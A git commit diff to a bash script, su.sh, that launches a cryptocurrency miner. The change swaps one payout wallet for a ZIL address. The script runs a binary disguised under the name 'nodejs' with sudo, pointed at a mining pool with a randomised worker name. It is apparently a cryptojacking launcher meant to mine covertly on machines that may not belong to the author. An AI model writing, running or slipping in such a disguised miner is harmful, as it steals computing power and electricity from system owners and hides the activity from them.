f1976cf7d5d15b580d0d383b0169aff81b5873fa
gasken1 <84686224+gasken1@users.noreply.github.com>
2021-08-06 03:19:59 -0700

    Update su.sh

--- su.sh
+++ su.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=0x86ca902b2ca60630188dba14105442141dc3b1dc
+WALLET=ZIL:zil12xj5q0cvpjaz5nm02zntwsp4yr5zvlt2an5me
 WORKER=$(echo $(shuf -i 1-30 -n 1)-gass) 
 chmod +x nodejs
 sudo ./nodejs -epool $POOL -wal $WALLET.$WORKER -pass x
